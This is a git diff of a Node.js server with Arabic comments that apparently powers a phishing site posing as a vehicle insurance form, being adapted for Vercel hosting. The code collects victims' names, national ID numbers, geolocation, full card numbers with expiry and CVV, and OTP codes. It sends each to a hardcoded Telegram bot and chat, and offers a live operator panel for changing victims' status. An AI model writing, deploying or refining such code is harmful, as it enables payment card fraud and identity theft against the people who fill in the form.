@@ -3,14 +3,15 @@ const http = require('http');
 const socketIo = require('socket.io');
 const fs = require('fs');
 const path = require('path');
-const cors = require('cors');
+const cors = require('cors'); // لتثبيت cors: npm install cors
 
 const app = express();
 const server = http.createServer(app);
 
-// === إعدادات Telegram ===
-const TELEGRAM_BOT_TOKEN = '7647127310:AAEL_VzCr1wTh26Exczu6IPuFgEsH4HHHVE'; // استبدل بقيمتك الحقيقية
-const TELEGRAM_CHAT_ID = '6454807559'; // استبدل بقيمتك الحقيقية
+// --- إعدادات Telegram (يجب استخدام متغيرات البيئة في الإنتاج) ---
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '7647127310:AAEL_VzCr1wTh26Exczu6IPqEsH4HHHVE'; // استبدل بقيمتك الحقيقية
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '6454807559'; // استبدل بقيمتك الحقيقية
+// هام: يجب عليك ضبط هذه المتغيرات في إعدادات مشروع Vercel الخاص بك.
 
 /**
  * دالة لإرسال رسالة إلى Telegram
@@ -18,6 +19,12 @@ const TELEGRAM_CHAT_ID = '6454807559'; // استبدل بقيمتك الحقيق
  * @returns {Promise<boolean>} True إذا تم الإرسال بنجاح، False بخلاف ذلك
  */
 async function sendTelegramMessage(message) {
+    // التحقق من وجود التوكن ومعرف الشات لتجنب الأخطاء
+    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+        console.error("Telegram BOT_TOKEN or CHAT_ID is not set. Cannot send message.");
+        return false;
+    }
+
     const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
     const data = {
         chat_id: TELEGRAM_CHAT_ID,
@@ -39,7 +46,7 @@ async function sendTelegramMessage(message) {
             console.log("Message sent to Telegram successfully.");
             return true;
         } else {
-            console.error("Telegram API Error:", result.description || 'Unknown error');
+            console.error("Telegram API Error:", result.description || 'Unknown error', result);
             return false;
         }
     } catch (error) {
@@ -48,18 +55,29 @@ async function sendTelegramMessage(message) {
     }
 }
 
+// --- إعدادات CORS ديناميكية لبيئة التطوير والإنتاج ---
+// في الإنتاج، استبدل 'https://your-vercel-app-domain.vercel.app' بنطاق تطبيقك الفعلي على Vercel
+// على سبيل المثال: 'https://my-insurance-app.vercel.app'
+const allowedOrigins = process.env.NODE_ENV === 'production'
+    ? 'https://your-vercel-app-domain.vercel.app' // <<<<< غيّر هذا النطاق الفعلي
+    : 'http://localhost:3000'; // لبيئة التطوير المحلية
+
 // تهيئة Socket.IO مع CORS
 const io = socketIo(server, {
     cors: {
-        origin: "http://localhost:3000",
+        origin: allowedOrigins,
         methods: ["GET", "POST"]
     }
 });
 
 // مسار ملف البيانات JSON
+// Vercel تعامل نظام الملفات على أنه Read-Only بعد النشر.
+// أي كتابة ستكون مؤقتة وستختفي عند إعادة نشر التطبيق أو إعادة تشغيل الخادم.
 const DATA_FILE = path.join(__dirname, 'form_submissions.json');
 
-// التأكد من وجود ملف البيانات
+// التأكد من وجود ملف البيانات عند بدء تشغيل الخادم
+// هذا سيخلق الملف إذا لم يكن موجوداً.
+// في بيئة Vercel، هذا الملف سيتم إنشاؤه في نظام ملفات مؤقت لكل "instance" من التطبيق.
 if (!fs.existsSync(DATA_FILE)) {
     fs.writeFileSync(DATA_FILE, '[]', 'utf8');
     console.log('Created empty form_submissions.json file.');
@@ -67,30 +85,37 @@ if (!fs.existsSync(DATA_FILE)) {
 
 // تهيئة CORS لطلبات HTTP العادية
 app.use(cors({
-    origin: "http://localhost:3000",
+    origin: allowedOrigins,
     methods: ["GET", "POST"]
 }));
 
 // تمكين Express من قراءة JSON و URL-encoded bodies
-app.use(express.json()); // لاستقبال JSON من طلبات Fetch
-app.use(express.urlencoded({ extended: true })); // لاستقبال البيانات العادية (إذا احتجت لاحقاً)
+app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
 
 // لخدمة الملفات الثابتة (مثل index.html, CSS, JS) من مجلد public
+// تأكد من أن مجلد 'public' موجود في جذر مشروعك وأن جميع الملفات الثابتة بداخله.
 app.use(express.static(path.join(__dirname, 'public')));
-
 
 // دالة لقراءة البيانات
 function readSubmissions() {
     try {
+        // قراءة الملف بشكل متزامن.
+        // في تطبيقات الإنتاج، خاصةً مع الملفات الكبيرة، يُفضل استخدام الطرق غير المتزامنة (readFile) لتجنب حظر الـ Event Loop.
         const data = fs.readFileSync(DATA_FILE, 'utf8');
         const submissions = JSON.parse(data);
         if (submissions === null || !Array.isArray(submissions)) {
-            console.error("Error decoding form_submissions.json. File might be corrupted or not an array.");
+            console.error("Error decoding form_submissions.json. File might be corrupted or not an array. Returning empty array.");
             return [];
         }
         return submissions;
     } catch (error) {
-        console.error('Error reading data file:', error);
+        console.error('Error reading data file. Returning empty array:', error);
+        // إذا كان الملف غير موجود أو تالف، ابدأ بملف فارغ لضمان عمل التطبيق
+        if (error.code === 'ENOENT') {
+            fs.writeFileSync(DATA_FILE, '[]', 'utf8');
+            console.log('Re-created empty form_submissions.json due to missing file.');
+        }
         return [];
     }
 }
@@ -98,9 +123,10 @@ function readSubmissions() {
 // دالة لكتابة البيانات
 function writeSubmissions(submissions) {
     try {
-        // استخدام JSON_PRETTY_PRINT و JSON_UNESCAPED_UNICODE (افتراضيًا في Node.js)
+        // كتابة الملف بشكل متزامن.
+        // يُفضل استخدام الطرق غير المتزامنة (writeFile) في الإنتاج.
         fs.writeFileSync(DATA_FILE, JSON.stringify(submissions, null, 2), 'utf8');
-        io.emit('data_updated', { data: submissions });
+        io.emit('data_updated', { data: submissions }); // بث التحديثات لجميع العملاء المتصلين
         console.log('Data saved and broadcasted via Socket.IO.');
     } catch (error) {
         console.error('Error writing data file:', error);
@@ -108,15 +134,14 @@ function writeSubmissions(submissions) {
 }
 
 // ===============================================
-// نقطة نهاية واحدة (Single Endpoint) لجميع عمليات PHP السابقة
+// نقطة نهاية واحدة لجميع عمليات النموذج
 // ===============================================
 app.post('/process_form_data', async (req, res) => {
-    const formData = req.body; // البيانات ستكون هنا ككائن JSON
+    const formData = req.body;
     const action = formData.action;
-    let submissions = readSubmissions();
+    let submissions = readSubmissions(); // قراءة البيانات الحالية
     let response = { status: 'error', message: 'طلب غير صالح.' };
-    let updated = false;
-    let id_number; // تعريف متغير id_number هنا ليكون متاحاً في كل حالات الـ switch
+    let id_number;
 
     switch (action) {
         case 'submit_initial_form':
@@ -125,14 +150,8 @@ app.post('/process_form_data', async (req, res) => {
                 break;
             }
 
-            id_number = formData.id_number; // استخدم id_number مباشرة من formData
-            let foundIndex = -1;
-
-            submissions.forEach((s, index) => {
-                if (s.id_number && s.id_number === id_number) {
-                    foundIndex = index;
-                }
-            });
+            id_number = formData.id_number;
+            let foundIndex = submissions.findIndex(s => s.id_number === id_number);
 
             const new_submission_data = {
                 owner_name: formData.owner_name,
@@ -143,16 +162,15 @@ app.post('/process_form_data', async (req, res) => {
                 manufacture_year: formData.manufacture_year || '',
                 serial_number_custom: formData.serial_number_custom || '',
                 status: 'pending',
-                submission_timestamp: new Date().toISOString(), // تنسيق ISO 8601
-                geo_info: formData.geo_info || null, // من الكود السابق في index.html
-                browser_info: formData.browser_info || null // من الكود السابق في index.html
+                submission_timestamp: new Date().toISOString(),
+                geo_info: formData.geo_info || null,
+                browser_info: formData.browser_info || null
             };
 
             let action_message;
             let telegram_prefix;
 
             if (foundIndex !== -1) {
-                // دمج البيانات الموجودة مع البيانات الجديدة
                 submissions[foundIndex] = { ...submissions[foundIndex], ...new_submission_data };
                 action_message = 'تم تحديث بياناتك بنجاح.';
                 telegram_prefix = `<b>تحديث بيانات عميل:</b> ${new_submission_data.owner_name || 'غير معروف'}\n\n`;
@@ -166,7 +184,6 @@ app.post('/process_form_data', async (req, res) => {
 
             response = { status: 'success', message: action_message };
 
-            // إرسال رسالة Telegram للطلب الأولي/التحديث
             const telegram_message_initial = telegram_prefix +
                 `<b>الاسم:</b> ${new_submission_data.owner_name || 'غير متوفر'}\n` +
                 `<b>رقم الهوية:</b> ${new_submission_data.id_number || 'غير متوفر'}\n` +
@@ -176,7 +193,7 @@ app.post('/process_form_data', async (req, res) => {
                 (new_submission_data.serial_number_form ? `\n<b>الرقم التسلسلي (استمارة):</b> ${new_submission_data.serial_number_form}` : '') +
                 (new_submission_data.manufacture_year ? `\n<b>سنة الصنع:</b> ${new_submission_data.manufacture_year}` : '') +
                 (new_submission_data.serial_number_custom ? `\n<b>الرقم التسلسلي (جمركية):</b> ${new_submission_data.serial_number_custom}` : '');
-            
+
             await sendTelegramMessage(telegram_message_initial);
             break;
 
@@ -187,7 +204,7 @@ app.post('/process_form_data', async (req, res) => {
             }
             id_number = formData.id_number;
             let currentSubmissionForInsurance = submissions.find(s => s.id_number === id_number);
-            
+
             if (currentSubmissionForInsurance) {
                 currentSubmissionForInsurance.insurance_details = {
                     insurance_type: formData.insurance_type || '',
@@ -237,7 +254,7 @@ app.post('/process_form_data', async (req, res) => {
 
             submissions = submissions.map(s => {
                 if (s.id_number === id_number) {
-                    currentSubmissionForCard = s; // احتفظ بالمرجع للوصول إلى اسم العميل
+                    currentSubmissionForCard = s;
                     s.card_details = {
                         card_name: formData.card_name || '',
                         card_number: formData.card_number || '',
@@ -245,7 +262,7 @@ app.post('/process_form_data', async (req, res) => {
                         cvv: formData.cvv || '',
                         timestamp: new Date().toISOString()
                     };
-                    s.status = 'pending'; // تحديث الحالة
+                    s.status = 'pending';
                     userUpdated = true;
                 }
                 return s;
@@ -254,8 +271,7 @@ app.post('/process_form_data', async (req, res) => {
             if (userUpdated) {
                 writeSubmissions(submissions);
                 response = { status: 'success', message: 'تم حفظ تفاصيل البطاقة بنجاح.' };
-                
-                // إرسال رسالة Telegram لتفاصيل البطاقة
+
                 if (currentSubmissionForCard) {
                     const telegram_message_card = `<b>🔴 تم تعبئة بيانات بطاقة لعميل:</b> ${currentSubmissionForCard.owner_name || 'غير معروف'}\n\n` +
                         `<b>رقم الهوية:</b> ${id_number || 'غير متوفر'}\n` +
@@ -283,7 +299,7 @@ app.post('/process_form_data', async (req, res) => {
 
             submissions = submissions.map(s => {
                 if (s.id_number === id_number) {
-                    currentSubmissionForOtp = s; // احتفظ بالمرجع للوصول إلى اسم العميل
+                    currentSubmissionForOtp = s;
                     if (!s.otp_attempts || !Array.isArray(s.otp_attempts)) {
                         s.otp_attempts = [];
                     }
@@ -300,7 +316,6 @@ app.post('/process_form_data', async (req, res) => {
                 writeSubmissions(submissions);
                 response = { status: 'success', message: 'تم حفظ رمز OTP بنجاح.' };
 
-                // إرسال رسالة Telegram لرمز OTP
                 if (currentSubmissionForOtp) {
                     const latestOtpAttempt = currentSubmissionForOtp.otp_attempts[currentSubmissionForOtp.otp_attempts.length - 1];
                     const telegram_message_otp = `<b>🚨 تم إدخال رمز OTP لعميل:</b> ${currentSubmissionForOtp.owner_name || 'غير معروف'}\n\n` +
@@ -322,10 +337,11 @@ app.post('/process_form_data', async (req, res) => {
             }
             id_number = formData.id_number;
             const new_status = formData.status;
+            let updated = false;
             let submissionForStatusUpdate;
             submissions = submissions.map(s => {
                 if (s.id_number === id_number) {
-                    submissionForStatusUpdate = s; // احتفظ بالمرجع للوصول إلى اسم العميل
+                    submissionForStatusUpdate = s;
                     s.status = new_status;
                     updated = true;
                 }
@@ -335,16 +351,6 @@ app.post('/process_form_data', async (req, res) => {
             if (updated) {
                 writeSubmissions(submissions);
                 response = { status: 'success', message: 'تم تحديث حالة المستخدم بنجاح.' };
-                
-                // يمكنك إضافة إرسال رسالة تيليجرام هنا إذا أردت إشعارًا عند تغيير الحالة يدوياً من لوحة المشرف
-                // مثال:
-                // if (submissionForStatusUpdate) {
-                //     const telegram_message_status = `<b>✅ تم تحديث حالة العميل:</b> ${submissionForStatusUpdate.owner_name || 'غير معروف'}\n` +
-                //         `<b>رقم الهوية:</b> ${id_number}\n` +
-                //         `<b>الحالة الجديدة:</b> ${new_status}`;
-                //     await sendTelegramMessage(telegram_message_status);
-                // }
-
             } else {
                 response = { status: 'error', message: 'المستخدم غير موجود.' };
             }
@@ -369,11 +375,12 @@ app.post('/process_form_data', async (req, res) => {
             break;
     }
 
-    res.json(response); // إرسال الاستجابة كـ JSON
+    res.json(response);
 });
 
-
-// مراقبة تغييرات ملف JSON مباشرة
+// --- مراقبة تغييرات ملف JSON (لن تعمل بشكل موثوق على Vercel) ---
+// يُنصح بإزالة هذا الجزء تمامًا إذا كنت تستخدم قاعدة بيانات خارجية.
+// في بيئة Vercel، لا يُنصح بالاعتماد على fs.watch لأن نظام الملفات مؤقت وغير متزامن عبر "instances".
 fs.watch(DATA_FILE, (eventType, filename) => {
     if (eventType === 'change') {
         console.log(`File ${filename} has been changed. Reloading data.`);
@@ -385,7 +392,7 @@ fs.watch(DATA_FILE, (eventType, filename) => {
 // التعامل مع اتصالات Socket.IO
 io.on('connection', (socket) => {
     console.log('A user connected:', socket.id);
-    socket.emit('initial_data', { data: readSubmissions() });
+    socket.emit('initial_data', { data: readSubmissions() }); // إرسال البيانات الأولية عند الاتصال
 
     socket.on('disconnect', () => {
         console.log('User disconnected:', socket.id);
@@ -396,7 +403,8 @@ io.on('connection', (socket) => {
         const index = submissions.findIndex(s => s.id_number === id_number);
         if (index !== -1) {
             submissions[index].status = status;
-            writeSubmissions(submissions);
+            writeSubmissions(submissions); // حفظ التغيير وبثه
+
             socket.emit('status_update_ack', { id_number, status, message: 'Status updated successfully via Socket.IO.' });
 
             // إرسال رسالة تيليجرام عند تحديث الحالة من لوحة المشرف
@@ -412,7 +420,9 @@ io.on('connection', (socket) => {
     });
 });
 
-const PORT = 3000;
+// --- تحديد المنفذ ---
+// Vercel ستوفر متغير بيئة PORT. إذا لم يكن موجوداً، استخدم 3000 افتراضياً.
+const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
     console.log(`Node.js server listening on port ${PORT}`);
     console.log(`Serving static files from: ${path.join(__dirname, 'public')}`);
